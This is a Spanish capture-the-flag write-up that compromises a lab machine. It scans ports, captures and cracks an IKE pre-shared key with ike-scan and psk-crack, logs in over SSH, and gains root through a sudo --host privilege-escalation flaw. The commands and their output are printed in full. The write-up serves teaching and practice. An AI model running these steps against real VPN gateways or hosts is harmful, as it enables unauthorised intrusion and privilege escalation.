### 1. Enumeración inicial

Empezamos enumerando los puertos abiertos de la máquina:

```bash
❯ sudo nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.11.87 -oG allPorts
[sudo] contraseña para abra: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-14 14:06 +0000
Initiating SYN Stealth Scan at 14:06
Scanning 10.10.11.87 [65535 ports]
Discovered open port 22/tcp on 10.10.11.87
Completed SYN Stealth Scan at 14:07, 15.99s elapsed (65535 total ports)
Nmap scan report for 10.10.11.87
Host is up, received user-set (0.079s latency).
Scanned at 2026-01-14 14:06:47 WET for 16s
Not shown: 54828 closed tcp ports (reset), 10706 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.12 seconds
           Raw packets sent: 79520 (3.499MB) | Rcvd: 56947 (2.278MB)
```

Curioso, solo nos reporta el SSH abierto con nuestro típico escaneo de puertos. Tendremos que probar otras formas de enumerar los puertos, porque con el SSH solamente no vamos a sacar nada útil. **Vamos a probar a enumerar los puertos abiertos UDP**:

```bash
❯ sudo nmap -sU --top-ports 200 10.10.11.87

[sudo] contraseña para abra: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-14 14:14 +0000
Nmap scan report for 10.10.11.87
Host is up (0.075s latency).
Not shown: 196 closed udp ports (port-unreach)
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike

Nmap done: 1 IP address (1 host up) scanned in 212.13 seconds
```

El puerto **500** es el que nos interesa. Estamos ante un servicio VPN (seguramente **IPSec**).

---
### 2. Enumeración IPSec y extracción de hash

Vamos a enumerarlo, de este servicio lo más que nos interesa es ver si podemos sacar un hash válido para iniciar sesión por SSH posteriormente. Usaremos la herramienta `ike-scan` para la enumeración/explotación.

```bash
❯ sudo ike-scan -A 10.10.11.87
[sudo] contraseña para abra: 
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87	Aggressive Mode Handshake returned HDR=(CKY-R=050072f541166d2c) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.097 seconds (10.36 hosts/sec).  1 returned handshake; 0 returned notify
❯ sudo ike-scan -M 10.10.11.87
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87	Main Mode Handshake returned
	HDR=(CKY-R=1ddd505a999a61d4)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.089 seconds (11.25 hosts/sec).  1 returned handshake; 0 returned notify
```

Tenemos un vector de ataque claro, el servidor usa PSK (Pre-Shared Key) y tenemos el ID/usuario (ike@expressway.htb). Podemos intentar crackear la PSK:

Vamos primero a obtener el hash PSK, lo obtendremos directamente del servidor y lo guardaremos en un archivo **test**:

```bash
❯ sudo ike-scan -A --id=ike@expressway.htb 10.10.11.87 --psk=test

Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87	Aggressive Mode Handshake returned HDR=(CKY-R=209b3674a0ef964b) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.091 seconds (10.98 hosts/sec).  1 returned handshake; 0 returned notify
❯ ls
󰡯 allPorts  󰡯 test
```

Ahora crackearemos el hash usando `psk-crack` (la herramienta viene junto a `ike-scan`).

```bash
❯ psk-crack -d /home/abra/Documentos/rockyou.txt test

Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 288c87a6c5e661c5ca48984a3b51eca39d5a22d3
Ending psk-crack: 8045039 iterations in 16.435 seconds (489499.69 iterations/sec)
```

---
### 3. Acceso inicial y user flag

Tenemos las credenciales `ike:freakingrockstarontheroad`, nos metemos por SSH y tenemos la user flag:

```bash
ssh ike@10.10.11.87
The authenticity of host '10.10.11.87 (10.10.11.87)' can't be established.
ED25519 key fingerprint is: SHA256:fZLjHktV7oXzFz9v3ylWFE4BS9rECyxSHdlLrfxRM8g
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.87' (ED25519) to the list of known hosts.
ike@10.10.11.87's password: 
Last login: Wed Jan 14 14:41:16 GMT 2026 from 10.10.14.115 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jan 14 14:46:42 2026 from 10.10.15.254
ike@expressway:~$ ls
user.txt
```

Ahora toca ir a por la root flag.

---
### 4. Enumeración local y análisis del sistema

Empezamos enumerando los permisos sudo de nuestro usuario:

```bash
ike@expressway:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

For security reasons, the password you type will not be visible.

Password: 
Sorry, user ike may not run sudo on expressway.
```

Nos dice que no tenemos privilegios sudo, igualmente es un poco raro que nos muestre este mensaje, como si fuera la primera vez que ejecuta alguien sudo en la máquina.

---
### 5. Descubrimiento de "anomalías" y rutas personalizadas

Enumerando un poco la máquina nos damos cuenta de que **el binario sudo está en una ruta no convencional, `/usr/local/bin/sudo`**. Esto quiere decir que probablemente es un **binario custom**, ya que la ruta normal suele ser **`/sbin/sudo`**.

```bash
ike@expressway:~$ which sudo
/usr/local/bin/sudo
```

Vamos a revisar los permisos de la ruta:

```bash
ike@expressway:~$ ls -l /usr/local/bin
total 2608
-rwxr-xr-x 1 root root 1218328 Aug 29 15:18 cvtsudoers
-rwsr-xr-x 1 root root 1047040 Aug 29 15:18 sudo
lrwxrwxrwx 1 root root       4 Aug 29 15:18 sudoedit -> sudo
-rwxr-xr-x 1 root root  401352 Aug 29 15:18 sudoreplay
```

No veo nada demasiado raro, los permisos están igual que los de un binario `sudo` normal. Vamos a seguir enumerando la máquina. Si tiramos un `id` vemos que nuestro usuario pertenece a un grupo **proxy**:

```bash
ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
```

Vamos a enumerar los ficheros y directorios que pertenezcan a dicho grupo:

```bash
ike@expressway:~$ find / -group proxy 2>/dev/null
/run/squid
/var/spool/squid
/var/spool/squid/netdb.state
/var/log/squid
/var/log/squid/cache.log.2.gz
/var/log/squid/access.log.2.gz
/var/log/squid/cache.log.1
/var/log/squid/access.log.1
```

---
### 6. Análisis de logs de proxy y descubrimiento crítico

Vemos que tenemos acceso a varios archivos del proxy **Squid**, vamos a ir revisando los logs a ver si encontramos algo interesante. El `/var/log/squid/access.log.1` contiene lo siguiente:

```bash
cat /var/log/squid/access.log.1
1753229566.990      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -
1753229580.379      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -
1753229580.417     15 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3944 GET /nmaplowercheck1753229281 - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 POST / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3926 GET /flumemaster.jsp - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3916 GET /master.jsp - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 PROPFIND / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3914 GET /.git/HEAD - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3926 GET /tasktracker.jsp - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -
1753229688.902      0 192.168.68.50 NONE_NONE/400 3896 PROPFIND / - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 NONE_NONE/400 3914 GET /rs-status - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://www.google.com/ - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 NONE_NONE/400 3902 POST /sdk - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
1753229689.010      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.010      0 192.168.68.50 NONE_NONE/400 3896 XDGY / - HIER_NONE/- text/html
1753229689.010      0 192.168.68.50 NONE_NONE/400 3916 GET /evox/about - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 NONE_NONE/400 3906 GET /HNAP1 - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 NONE_NONE/400 3896 PROPFIND / - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 TCP_DENIED/403 381 HEAD http://www.google.com/ - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 NONE_NONE/400 3934 GET /browseDirectory.jsp - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 NONE_NONE/400 3924 GET /jobtracker.jsp - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 NONE_NONE/400 3916 GET /status.jsp - HIER_NONE/- text/html
1753229689.114      0 192.168.68.50 NONE_NONE/400 3916 GET /robots.txt - HIER_NONE/- text/html
1753229689.114      0 192.168.68.50 NONE_NONE/400 3922 GET /dfshealth.jsp - HIER_NONE/- text/html
1753229689.165      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.165      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229689.165      0 192.168.68.50 NONE_NONE/400 3918 GET /favicon.ico - HIER_NONE/- text/html
1753229689.222      0 192.168.68.50 TCP_DENIED/403 3768 CONNECT www.google.com:80 - HIER_NONE/- text/html
1753229689.322      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.322      0 192.168.68.50 NONE_NONE/400 381 HEAD / - HIER_NONE/- text/html
1753229689.322      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229689.475      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.526      0 192.168.68.50 NONE_NONE/400 3896 POST / - HIER_NONE/- text/html
1753229689.629      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.680      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.783      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.933      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229690.086      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229719.140      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229719.245      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229760.700      0 192.168.68.50 NONE_NONE/400 3918 GET /randomfile1 - HIER_NONE/- text/html
1753229760.722      0 192.168.68.50 NONE_NONE/400 3908 GET /frand2 - HIER_NONE/- text/html
```

Tenemos un dominio descubierto: `offramp.expressway.htb`. Este dominio **no es accesible ni desde dentro de la máquina vulnerable, al menos por la dirección IP que muestran los logs**.

---
### 7. Identificación y explotación de vulnerabilidad en sudo

Antes de seguir vamos a ver que versión de sudo tiene instalada el sistema:

```bash
ike@expressway:~$ sudo -V
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

Esta versión de sudo en principio es vulnerable a **escalada de privilegios mediante la opción Host**. https://www.exploit-db.com/exploits/52354

El binario sudo tiene una opción `--host` que sirve para conectarse a hosts/dominios remotos, en esta versión, **cualquier comando que este permitido en el dominio remoto lo ejecutará en la máquina local**.

Antes no nos dejó ejecutar `sudo -l` en la máquina, pero si le añadimos el host `offramp.expressway.htb` **veremos que podremos ejecutarlo**:

```bash
ike@expressway:~$ sudo -l -h offramp.expressway.htb
Matching Defaults entries for ike on offramp:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User ike may run the following commands on offramp:
    (root) NOPASSWD: ALL
    (root) NOPASSWD: ALL
```

Con el parámetro `-i` obtenemos acceso a una consola como el usuario `root` en la máquina local:

```shell
ike@expressway:~$ sudo -h offramp.expressway.htb -i
root@expressway:~# whoami
root
root@expressway:~# ls /root
root.txt
```

Ya con esto hemos terminado de comprometer la máquina.